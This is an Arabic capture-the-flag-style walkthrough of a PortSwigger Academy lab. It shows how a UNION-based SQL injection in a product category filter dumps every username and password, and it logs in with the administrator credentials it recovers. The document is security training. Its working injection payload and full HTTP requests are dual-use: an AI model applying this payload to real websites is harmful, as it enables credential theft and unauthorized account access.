# [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

## **`الهدف`**
قم بتنفيذ هجوم `UNION SQLi` يقوم بإسترجاع/عرض كل أسماء المستخدمين وكلمات المرور ثم قم بتسجيل الدخول بحساب `administrator`.
## **`خطوات الحل`**
نقوم بالدخول إلى اللاب ثم نضغط على أى `category` مثل `Pet` وإعتراض الطلب وتحويله إلى `Repeater`.
```http
GET /filter?category=Pets HTTP/2
Host: 0a6100030454994080e82b61004e00b0.web-security-academy.net
Cookie: session=540mqf6fQNzaPOYvBC8hlkZNekgeFu3b
```

ثم نحقن أمر الاستعلام التالي داخل الـ `Parameter` الخاص بالـ `Category` الموجود في `Inspector`
```sql
' UNION SELECT username, password FROM users--
```

```http
GET /filter?category=Pets%20'%20UNION%20SELECT%20username%2c%20password%20FROM%20users-- HTTP/2
Host: 0a6100030454994080e82b61004e00b0.web-security-academy.net
Cookie: session=540mqf6fQNzaPOYvBC8hlkZNekgeFu3b
```
ثم نقوم بإرسال الطلب ونقوم بالضغط على `Mouse right-click` ثم `Copy URL` ونقوم بفتحه في المتصفح وسنجد بيانات جميع المستخدمين ظاهرة فنقوم بعدها بتسجيل الدخول إلى حساب `administrator:g670fktbzyiul7dzhcvr` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)
